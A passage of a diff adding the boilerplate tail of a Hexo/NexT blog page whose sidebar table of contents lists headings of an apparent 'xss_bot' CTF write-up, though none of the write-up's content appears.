+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-bot"><span class="nav-number">1.</span> <span class="nav-text">xss_bot</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E8%A7%A3"><span class="nav-number">1.1.</span> <span class="nav-text">正解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E4%B8%8D%E9%80%9A%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">一开始不通的解法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-bot-no-internet"><span class="nav-number">2.</span> <span class="nav-text">xss_bot no internet</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="unknown"
+      src="/images/unknown.jpg">
+  <p class="site-author-name" itemprop="name">unknown</p>
+  <div class="site-description" itemprop="description">memories matter</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">unknown</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
